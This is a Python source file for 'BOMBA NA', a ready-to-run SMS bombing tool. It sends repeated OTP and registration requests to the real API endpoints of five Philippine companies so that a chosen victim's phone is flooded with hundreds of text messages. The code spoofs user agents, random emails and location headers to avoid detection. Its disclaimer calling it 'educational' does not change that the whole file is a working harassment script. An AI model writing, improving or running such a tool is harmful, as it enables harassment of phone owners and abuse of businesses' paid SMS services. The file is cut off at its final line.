import requests
import random
import string
import time
import json
import sys
import asyncio
import aiohttp
from typing import List, Dict

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'
    GRAY = '\033[90m'

class UI:
    @staticmethod
    def clear():
        import os
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def banner():
        UI.clear()
        banner = f"""
{Colors.GREEN}{Colors.BOLD}
██████╗  ██████╗ ███╗   ███╗██████╗  █████╗     ███╗   ██╗ █████╗ 
██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔══██╗    ████╗  ██║██╔══██╗
██████╔╝██║   ██║██╔████╔██║██████╔╝███████║    ██╔██╗ ██║███████║
██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══██║    ██║╚██╗██║██╔══██║
██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝██║  ██║    ██║ ╚████║██║  ██║
╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═══╝╚═╝  ╚═╝
                    {Colors.WHITE}by Homer Rebatis{Colors.RESET}
{Colors.GREEN}{'═' * 70}{Colors.RESET}
{Colors.WHITE}           Advanced Multi-Provider SMS Bomber Tool{Colors.RESET}
{Colors.GREEN}{'═' * 70}{Colors.RESET}
"""
        print(banner)
    
    @staticmethod
    def header(text):
        width = 70
        print(f"\n{Colors.GREEN}{Colors.BOLD}╔{'═' * (width - 2)}╗{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}║{text.center(width - 2)}║{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}╚{'═' * (width - 2)}╝{Colors.RESET}")
    
    @staticmethod
    def menu_item(number, text, color=Colors.WHITE):
        print(f"  {color}{Colors.BOLD}[{number}]{Colors.RESET} {text}")
    
    @staticmethod
    def input_prompt(text):
        return input(f"{Colors.GREEN}{Colors.BOLD}➜ {text}: {Colors.RESET}")
    
    @staticmethod
    def success(text):
        print(f"{Colors.GREEN}[+] {text}{Colors.RESET}")
    
    @staticmethod
    def error(text):
        print(f"{Colors.RED}[-] {text}{Colors.RESET}")
    
    @staticmethod
    def info(text):
        print(f"{Colors.WHITE}• {text}{Colors.RESET}")
    
    @staticmethod
    def progress(current, total, provider, status):
        status_color = Colors.GREEN if status else Colors.RED
        status_text = "SUCCESS" if status else "FAILED"
        bar_width = 40
        filled = int((current / total) * bar_width)
        bar = '█' * filled + '░' * (bar_width - filled)
        
        print(f"\r{Colors.WHITE}[{current}/{total}] {Colors.GREEN}{bar}{Colors.RESET} "
              f"{Colors.WHITE}{provider:<20}{Colors.RESET} {status_color}{status_text}{Colors.RESET}", end='')
        
        if current == total:
            print()  # New line after completion
    
    @staticmethod
    def stats_box(success, failed, total, target, provider):
        print(f"\n{Colors.GREEN}{Colors.BOLD}╔{'═' * 50}╗{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}║{'ATTACK SUMMARY'.center(50)}║{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}╠{'═' * 50}╣{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.WHITE}Provider: {provider:<36} {Colors.GREEN}║{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.WHITE}Target: {target:<38} {Colors.GREEN}║{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.GREEN}[+] Successful: {success:<29} {Colors.GREEN}║{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.RED}[-] Failed: {failed:<33} {Colors.GREEN}║{Colors.RESET}")
        print(f"{Colors.WHITE}║ {Colors.WHITE}Total Sent: {total:<34} {Colors.GREEN}║{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}╚{'═' * 50}╝{Colors.RESET}")

def random_string(length):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def random_gmail():
    return f"{random_string(8)}@gmail.com"

# The normalize_phone_number and format_number_without_plus functions are kept as
# they might be used internally by the provider classes, even if the main flow
# passes the raw input.

class SMSProvider:
    def __init__(self, name):
        self.name = name
        self.success_count = 0
        self.fail_count = 0
    
    async def send_sms(self, phone_number):
        """Override this method in subclasses"""
        raise NotImplementedError
    
    def get_stats(self):
        return {
            "success": self.success_count,
            "failed": self.fail_count,
            "total": self.success_count + self.fail_count
        }
    
    def reset_stats(self):
        self.success_count = 0
        self.fail_count = 0

# --- SMS Provider Classes (No Changes Here) ---

class AbensonProvider(SMSProvider):
    def __init__(self):
        super().__init__("Abenson")
    
    async def send_sms(self, phone_number):
        try:
            # Abenson uses 09 format
            data = {
                "contact_no": phone_number,
                "login_token": "undefined"
            }
            
            headers = {
                'User-Agent': 'okhttp/4.9.0',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
                async with session.post(
                    'https://api.mobile.abenson.com/api/public/membership/activate_otp',
                    headers=headers,
                    data=data
                ) as response:
                    # Check if request was successful
                    if response.status == 200:
                        self.success_count += 1
                        return True
                    else:
                        self.fail_count += 1
                        return False
        except Exception as e:
            self.fail_count += 1
            return False

class LBCProvider(SMSProvider):
    def __init__(self):
        super().__init__("LBC Connect")
    
    async def send_sms(self, phone_number):
        try:
            # **IMPORTANT**: LBC ALWAYS WORKED WITH 09 FORMAT
            
            data = {
                "verification_type": "mobile",
                "client_email": random_gmail(),
                "client_contact_code": "",  # Leave empty when using 09 format
                "client_contact_no": phone_number,  # Use 09xxxxxxxxx directly
                "app_log_uid": random_string(16),
            }
            
            headers = {
                'User-Agent': 'Dart/2.19 (dart:io)',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
                async with session.post(
                    'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
                    headers=headers,
                    data=data
                ) as response:
                    # Validate response
                    if response.status == 200:
                        self.success_count += 1
                        return True
                    else:
                        self.fail_count += 1
                        return False
        except Exception as e:
            self.fail_count += 1
            return False

class ExcellentLendingProvider(SMSProvider):
    def __init__(self):
        super().__init__("Excellent Lending")
    
    async def send_sms(self, phone_number):
        try:
            # IMPORTANT: Original code uses number AS-IS (no conversion!)
            
            coordinates = [
                {"lat": "14.5995", "long": "120.9842"},
                {"lat": "14.6760", "long": "121.0437"},
                {"lat": "14.8648", "long": "121.0418"}
            ]
            user_agents = [
                'okhttp/4.12.0',
                'okhttp/4.9.2',
                'Dart/3.6 (dart:io)',
            ]
            
            coord = random.choice(coordinates)
            agent = random.choice(user_agents)
            
            data = {
                "domain": phone_number,  # Use as-is from original code
                "cat": "login",
                "previous": False,
                "financial": "efe35521e51f924efcad5d61d61072a9"
            }
            
            headers = {
                'User-Agent': agent,
                'Content-Type': 'application/json; charset=utf-8',
                'x-latitude': coord["lat"],
                'x-longitude': coord["long"]
            }
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
                    headers=headers,
                    json=data
                ) as response:
                    # Match original: always return True on completion
                    self.success_count += 1
                    return True
        except Exception:
            self.fail_count += 1
            return False

class WeMoveProvider(SMSProvider):
    def __init__(self):
        super().__init__("WeMove")
    
    async def send_sms(self, phone_number):
        try:
            # Original code: remove leading 0 if exists
            phone_no = phone_number.replace('0', '', 1) if phone_number.startswith('0') else phone_number
            
            data = {
                "phone_country": "+63",
                "phone_no": phone_no
            }
            
            headers = {
                'User-Agent': 'okhttp/4.9.3',
                'Content-Type': 'application/json',
                'xuid_type': 'user',
                'source': 'customer',
                'authorization': 'Bearer'
            }
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                async with session.post(
                    'https://api.wemove.com.ph/auth/users',
                    headers=headers,
                    json=data
                ) as response:
                    # WeMove needs validation - check if actually sent
                    if response.status in [200, 201]:
                        self.success_count += 1
                        return True
                    else:
                        self.fail_count += 1
                        return False
        except Exception:
            self.fail_count += 1
            return False

class HoneyLoanProvider(SMSProvider):
    def __init__(self):
        super().__init__("Honey Loan")
    
    async def send_sms(self, phone_number):
        try:
            # IMPORTANT: Original code uses number AS-IS (no conversion!)
            
            data = {
                "phone": phone_number,  # Use as-is from original code
                "is_rights_block_accepted": 1
            }
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                'Content-Type': 'application/json',
            }
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://api.honeyloan.ph/api/client/registration/step-one',
                    headers=headers,
                    json=data
                ) as response:
                    # Match original: always return True on completion
                    self.success_count += 1
                    return True
        except Exception:
            self.fail_count += 1
            return False

# --- Modified BombaNa Class ---

class BombaNa:
    def __init__(self):
        # Changed providers to a list/dict of providers for easier iteration
        self.providers: List[SMSProvider] = [
            AbensonProvider(),
            LBCProvider(),
            ExcellentLendingProvider(),
            WeMoveProvider(),
            HoneyLoanProvider()
        ]
        # Also keep a dict for easy lookup if needed, but not strictly required now
        self.provider_map: Dict[str, SMSProvider] = {p.name: p for p in self.providers}
    
    async def execute_provider_attack(self, provider: SMSProvider, phone_number: str, limit: int):
        """Executes the attack for a single provider."""
        provider.reset_stats()
        
        UI.header(f"ATTACK INITIATED: {provider.name}")
        print(f"\n{Colors.WHITE}Target: {phone_number}{Colors.RESET}")
        print(f"{Colors.WHITE}Provider: {provider.name}{Colors.RESET}")
        print(f"{Colors.WHITE}Limit: {limit} SMS{Colors.RESET}\n")
        
        print(f"{Colors.GREEN}{'─' * 70}{Colors.RESET}\n")
        
        for i in range(1, limit + 1):
            result = await provider.send_sms(phone_number)
            UI.progress(i, limit, provider.name, result)
            
            # Match original delay timing
            await asyncio.sleep(1.0)
        
        print(f"\n{Colors.GREEN}{'─' * 70}{Colors.RESET}")
        
        stats = provider.get_stats()
        UI.stats_box(stats['success'], stats['failed'], stats['total'], phone_number, provider.name)

    async def execute_all_providers_attack(self, phone_number: str, limit: int):
        """Executes the attack for all configured providers sequentially."""
        
        for provider in self.providers:
            await self.execute_provider_attack(provider, phone_number, limit)
            print("\n\n") # Add space between provider results

    def show_main_menu(self):
        UI.banner()
        UI.header("MAIN MENU")
        print()
        # Changed option 1 to reflect the new functionality
        UI.menu_item("1", "Launch ALL-IN-ONE Attack (All Providers)", Colors.GREEN)
        UI.menu_item("2", "About", Colors.WHITE)
        UI.menu_item("3", "Exit", Colors.RED)
        print()
    
    # Removed show_provider_menu
    
    def show_about(self):
        # ... (About method remains the same) ...
        UI.banner()
        UI.header("ABOUT BOMBA NA")
        print()
        
        print(f"{Colors.GREEN}{Colors.BOLD}▸ Description:{Colors.RESET}")
        UI.info("BOMBA NA is an advanced multi-provider Send OTP tool")
        UI.info("Designed for educational and testing purposes only")
        print()
        
        print(f"{Colors.GREEN}{Colors.BOLD}▸ Features:{Colors.RESET}")
        UI.info("5 Different SMS Service Providers")
        UI.info("Real-time Progress Tracking")
        UI.info("Detailed Send Statistics")
        UI.info("Clean and Modern Interface")
        UI.info("Async Concurrent Processing")
        print()
        
        print(f"{Colors.GREEN}{Colors.BOLD}▸ Supported Providers:{Colors.RESET}")
        UI.info("Abenson - Appliance store OTP service")
        UI.info("LBC Connect - Delivery service OTP")
        UI.info("Excellent Lending - Loan provider OTP")
        UI.info("WeMove - Moving service OTP")
        UI.info("Honey Loan - Loan service OTP")
        print()
        
        print(f"{Colors.GREEN}{Colors.BOLD}▸ Phone Number Format:{Colors.RESET}")
        UI.info("09xxxxxxxxx (e.g., 09123456789)")
        UI.info("9xxxxxxxxx (e.g., 9123456789)")
        UI.info("+639xxxxxxxxx (e.g., +639123456789)")
        print()
        
        print(f"{Colors.RED}{Colors.BOLD}▸ Important Notice:{Colors.RESET}")
        UI.error("Use this tool responsibly and ethically")
        UI.error("Only use on numbers you own or have permission to test")
        UI.error("Misuse may violate laws and regulations")
        UI.error("Author is not responsible for any misuse")
        print()
        
        print(f"{Colors.WHITE}{Colors.BOLD}Created by: Homer Rebatis{Colors.RESET}")
        print(f"{Colors.GRAY}Version: 1.2.0{Colors.RESET}")
        print()
        
        UI.input_prompt("Press Enter to continue")
    
    async def start(self):
        while True:
            try:
                self.show_main_menu()
                choice = UI.input_prompt("Select option")
                
                if choice == "1":
                    await self.all_in_one_configuration() # New method for combined config
                elif choice == "2":
                    self.show_about()
                elif choice == "3":
                    UI.clear()
                    print(f"\n{Colors.GREEN}{Colors.BOLD}Thank you for using BOMBA NA!{Colors.RESET}")
                    print(f"{Colors.WHITE}Created by Homer Rebatis{Colors.RESET}\n")
                    sys.exit(0)
                else:
                    UI.error("Invalid option! Please try again.")
                    await asyncio.sleep(1.5)
                    
            except KeyboardInterrupt:
                UI.clear()
                print(f"\n{Colors.RED}{Colors.BOLD}Process interrupted by user{Colors.RESET}\n")
                sys.exit(0)
            except Exception as e:
                UI.error(f"An error occurred: {e}")
                await asyncio.sleep(2)

    async def all_in_one_configuration(self):
        """Handles input for the all-in-one attack and executes it."""
        while True:
            UI.banner()
            UI.header("ALL-IN-ONE SMS CONFIGURATION")
            print()
            print(f"{Colors.WHITE}Providers: {', '.join(p.name for p in self.providers)}{Colors.RESET}")
            print(f"{Colors.GRAY}Format: 09xxxxxxxxx (standard format){Colors.RESET}")
            print(f"{Colors.GREEN}{'─' * 70}{Colors.RESET}\n")
            
            # Get target number
            phone_number = UI.input_prompt("ENTER TARGET NUMBER")
            
            # Validate phone number
            import re
            if not re.match(r'^(09\d{9}|9\d{9}|\+639\d{9})$', phone_number.replace(' ', '')):
                UI.error("Invalid phone number format!")
                UI.info("Example: 09123456789")
                await asyncio.sleep(2)
                continue
            
            # Get limit
            print()
            limit_input = UI.input_prompt("LIMIT PER PROVIDER (1-300+)")
            
            try:
                limit = int(limit_input)
                if limit < 1:
                    UI.error("Limit must be at least 1!")
                    await asyncio.sleep(2)
                    continue
                if limit > 500:
                    print(f"{Colors.RED}Warning: High limit detected! Limiting to 500 for safety.{Colors.RESET}")
                    limit = 500
                    await asyncio.sleep(2)
            except ValueError:
                UI.error("Invalid limit! Please enter a number.")
                await asyncio.sleep(2)
                continue
            
            # Execute all-in-one attack
            await self.execute_all_providers_attack(phone_number, limit)
            
            # Ask if user wants to continue
            print(f"\n{Colors.GREEN}{'─' * 70}{Colors.RESET}")
            continue_attack = UI.input_prompt("Launch another ALL-IN-ONE attack? (y/n)")
            if continue_attack.lower() != 'y':
                UI.success("Returning to main menu...")
                return # Go back to main menu

if __name__ == '__main__':
    # Initial setup to handle Windows event loop policy
    if sys.platform.startswith('win'):
        try:
            # Check for Python 3.8+ Windows policy
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        except AttributeError:
            # Fallback for older versions or other environments
            pass
            
    try:
        bomba = BombaNa()
        asyncio.run(bomba.start())
    except KeyboardInterrupt:
        UI.clear()
        print(f"\n{Colors.RED}{Colors.BOLD}Process interrupted by user{Colors.RESET}\n")
        sys.exit(0)
    except Exception as e:
        UI.clear()
        print(f"\n{Colors.RED}{Colors.BOLD}A critical error occurred: {e}{Colors.RESET}\n")
        sys
